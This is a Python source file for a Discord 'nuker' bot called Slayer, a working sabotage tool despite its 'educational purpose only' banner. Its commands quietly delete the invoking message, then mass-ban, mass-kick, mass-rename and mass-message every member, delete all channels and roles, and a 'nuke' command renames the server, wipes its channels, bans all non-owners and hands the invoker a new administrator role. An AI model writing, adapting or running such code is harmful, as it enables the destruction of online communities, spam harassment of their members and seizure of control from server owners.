# -*- coding: utf-8 -*-
import discord
import json
import colorama
import traceback
import time

from discord.ext import commands
from discord.ext.commands import errors
from colorama import Fore, Back, Style

colorama.init()

def is_owner(ctx):
    return ctx.author.id in config['owners']

def user_is_owner(id: int):
    return id in config["owners"]

async def msg_delete(ctx):
    try:
        await ctx.message.delete()
    except:
        print(Fore.YELLOW + "Can't delete your message")

print(Fore.LIGHTRED_EX + "\n")
print("  _____ _                       \n"
      " / ____| |                      \n"
      "| (___ | | __ _ _   _  ___ _ __ \n"
      " \___ \| |/ _` | | | |/ _ \ '__|\n"
      " ____) | | (_| | |_| |  __/ |   \n"
      "|_____/|_|\__,_|\__, |\___|_|   \n"
      "                 __/ |          \n"
      "                |___/           \n"
      "\n"
      "Created by ICE\n"
      "Use for educational Purpose only!\n")

try:
    with open(f"config.json", encoding='utf8') as data:
        config = json.load(data)
    token = config["token"]
    prefix = config["prefix"]
    owners = config["owners"]
    print(Fore.CYAN + f'Loaded config.json\nPrefix is "{prefix}"')
except FileNotFoundError:
    print(Fore.LIGHTBLUE_EX)
    token = input("Enter token: ")
    prefix = input("Enter prefix: ")
    owners = input("Enter bot's owner ID (If several use ','): ")
    owners = owners.replace(" ", "")
    if "," in owners:
        owners = owners.split(",")
        owners = list(map(int, owners))
    config = {
        "token": token,
        "prefix": prefix,
        "owners": owners
    }
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    print(Fore.CYAN + "Created config.json")


bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())


@bot.event
async def on_ready():
    print(Fore.GREEN + f"Ready\nLogged in as {bot.user} | {bot.user.id}")


@bot.event
async def on_command_error(ctx, err):
    if isinstance(err, errors.BadArgument):
        return
    print(type(err).__name__, ''.join(traceback.format_tb(err.__traceback__)), err)


@bot.group(aliases=["all", "a"])
async def allusersandroles(ctx):
    pass


@allusersandroles.group(aliases=["users", "u"])
async def allusers(ctx):
    pass


@allusers.command(aliases=["ban", "bn"])
async def allban(ctx):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        try:
            if m.id not in config["owners"]:
                await m.ban()
                print(Fore.GREEN + f"Banned {m.name}")
            print(Fore.YELLOW + f"{m.name} is owner")
        except Exception as e:
            print(Fore.YELLOW + f"Can't ban {m.name} ({e})")


@allusers.command(aliases=["kick", "kk"])
async def allkick(ctx):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        try:
            if m.id not in config["owners"]:
                await m.kick()
                print(Fore.GREEN + f"Kicked {m.name}")
            print(Fore.YELLOW + f"{m.name} is owner")
        except Exception as e:
            print(Fore.YELLOW + f"Can't kick {m.name} ({e})")


@allusers.command(aliases=["addrole", "ar"])
async def alladdrole(ctx, roleId: int=None):
    await msg_delete(ctx)
    if roleId:
        for m in ctx.guild.members:
            try:
                await m.add_roles(ctx.guild.get_role(roleId))
                print(Fore.GREEN + f"Added role to {m.name}")
            except Exception as e:
                print(Fore.YELLOW + f"Can't add role to {m.name} ({e})")


@allusers.command(aliases=["remrole", "rr"])
async def allremrole(ctx, roleId: int=None):
    await msg_delete(ctx)
    if roleId:
        for m in ctx.guild.members:
            try:
                await m.remove_roles(ctx.guild.get_role(roleId))
                print(Fore.GREEN + f"Removed role from {m.name}")
            except Exception as e:
                print(Fore.YELLOW + f"Can't remove role from {m.name} ({e})")


@allusers.command(aliases=["nickname", "nn"])
async def allnickname(ctx, *, name: str=None):
    await msg_delete(ctx)
    if not name:
        name = bot.user.name
    for m in ctx.guild.members:
        try:
            await m.edit(nick=name)
            print(Fore.GREEN + f"Changed {m.name}'s nickname")
        except Exception as e:
            print(Fore.YELLOW + f"Can't change {m.name}'s nickname ({e})")


@allusers.command(aliases=["pm"])
async def allpm(ctx, *, message: str=None):
    await msg_delete(ctx)
    if message:
        for m in ctx.guild.members:
            try:
                await m.send(message)
                print(Fore.GREEN + f"Sent message to {m.name}")
            except Exception as e:
                print(Fore.YELLOW + f"Can't send message to {m.name} ({e})")


@allusers.command(aliases=["mute", "mt"])
async def allmute(ctx, mute: bool = None):
    await msg_delete(ctx)
    if mute is not None:
        for m in ctx.guild.members:
            try:
                if m.voice:
                    await m.edit(mute=mute)
                    print(Fore.GREEN + f"{m.name}'s mute set to {mute}")
                else:
                    print(Fore.YELLOW + f"{m.name} not in voice channel")
            except Exception as e:
                print(Fore.YELLOW + f"Can't set {m.name}'s mute to {mute} ({e})")


@allusers.command(aliases=["deafen", "dn"])
async def alldeafen(ctx, deafen: bool = None):
    await msg_delete(ctx)
    if deafen is not None:
        for m in ctx.guild.members:
            try:
                if m.voice:
                    await m.edit(deafen=deafen)
                    print(Fore.GREEN + f"{m.name}'s deafen set to {deafen}")
                else:
                    print(Fore.YELLOW + f"{m.name} not in voice channel")
            except Exception as e:
                print(Fore.YELLOW + f"Can't set {m.name}'s deafen to {deafen} ({e})")


@allusers.command(aliases=["move", "mv"])
async def allmove(ctx, channel: int = None):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        try:
            if m.voice:
                await m.edit(voice_channel=ctx.guild.get_channel(channel))
                print(Fore.GREEN + f"Moved {m.name}")
            else:
                print(Fore.YELLOW + f"{m.name} not in voice channel")
        except Exception as e:
            print(Fore.YELLOW + f"Can't move {m.name} ({e})")


@allusersandroles.group(aliases=["channels", "ch"])
async def allchannels(ctx):
    pass


@allchannels.command(aliases=["delete", "del"])
async def allchannelsdel(ctx):
    await msg_delete(ctx)
    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(Fore.GREEN + f"Deleted channel {ch.name}")
        except Exception as e:
            print(Fore.YELLOW + f"Can't delete channel {ch.name} ({e})")


@bot.group(aliases=["user", "u"])
async def oneuser(ctx):
    pass


@oneuser.command(aliases=["pm"])
async def userpm(ctx, member: discord.Member=None, *, message: str=None):
    await msg_delete(ctx)
    if member and message:
        try:
            await member.send(message)
            print(Fore.GREEN + f"Sent message to {member.name}")
        except Exception as e:
            print(Fore.YELLOW + f"Can't send message to {member.name} ({e})")


@bot.group(aliases=["role", "r"])
async def onerole(ctx):
    pass


@onerole.command(aliases=["create", "cr"])
async def rolecreate(ctx, admin: bool, *, name: str = None):

    # TODO: Change role position

    await msg_delete(ctx)
    perms = discord.Permissions(administrator=admin)
    if name:
        try:
            await ctx.guild.create_role(name=name, permissions=perms)
            print(Fore.GREEN + f"Created role {name}")
        except Exception as e:
            print(Fore.GREEN + f"Can't create role {name} ({e})")


@onerole.command(aliases=["delete", "del"])
async def roledel(ctx, id: int = None):
    await msg_delete(ctx)
    r = ctx.guild.get_role(id)
    if id:
        try:
            await r.delete()
            print(Fore.GREEN + f"Deleted {r.name}")
        except Exception as e:
            print(Fore.YELLOW + f"Can't delete {r.name} ({e})")


@onerole.command(aliases=["admin", "adm"])
async def roleadmin(ctx, id: int = None, admin: bool = None):
    await msg_delete(ctx)
    perms = discord.Permissions(administrator=admin)
    r = ctx.guild.get_role(id)
    if id and admin is not None:
        try:
            await r.edit(permissions=perms)
            print(Fore.GREEN + f"{r.name} admin is now {admin}")
        except Exception as e:
            print(Fore.YELLOW + f"Can't set {r.name} admin to {admin} ({e})")


@onerole.command(aliases=["position", "pos"])
async def rolepos(ctx, id: int = None, pos: int = None):
    await msg_delete(ctx)
    r = ctx.guild.get_role(id)
    if id and pos:
        try:
            await r.edit(position=pos)
            print(Fore.GREEN + f"Set {r.name} position to {pos}")
        except Exception as e:
            print(Fore.YELLOW + f"Can't set {r.name} position to {pos} ({e})")


@bot.group(aliases=["hard", "h"])
async def hardcommands(ctx):
    pass


@hardcommands.command(aliases=["nuke", "nk"])
async def hardnuke(ctx, ban: bool = True, *, text: str = "Резня"):
    await msg_delete(ctx)

    icon = await ctx.message.attachments[0].read() if ctx.message.attachments else None
    await ctx.guild.edit(name=text, icon=icon, banner=icon)

    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(Fore.GREEN + f"Deleted channel {ch.name}")
        except Exception as e:
            print(Fore.YELLOW + f"Can't delete channel {ch.name} ({e})")

    if ban:
        for m in ctx.guild.members:
            try:
                if m.id not in config["owners"]:
                    await m.ban()
                    print(Fore.GREEN + f"Banned {m.name}")
                print(Fore.YELLOW + f"{m.name} is owner")
            except Exception as e:
                print(Fore.YELLOW + f"Can't ban {m.name} ({e})")

    perms = discord.Permissions(administrator=True)
    try:
        role = await ctx.guild.create_role(name=text, permissions=perms)
        await ctx.message.author.add_roles(role)
        print(Fore.GREEN + f"Added admin role")
    except Exception as e:
        print(Fore.GREEN + f"Can't add admin role ({e})")

    overwrites = {ctx.guild.default_role: discord.PermissionOverwrite(send_messages=True),
             ctx.author: discord.PermissionOverwrite(send_messages=True)}
    await ctx.guild.create_text_channel(name=text, overwrites=overwrites)


while True:
    try:
        bot.run(token)
    except discord.errors.LoginFailure:
        print(Fore.RED + "Can't login, are you sure you entered token correctly?")
        input(Fore.CYAN + "Press ENTER to exit")
        raise SystemExit
    except Exception as e:
        print(Fore.RED + traceback.format_exc())
        print("\nRetrying in 10 seconds")
        time.sleep(10)
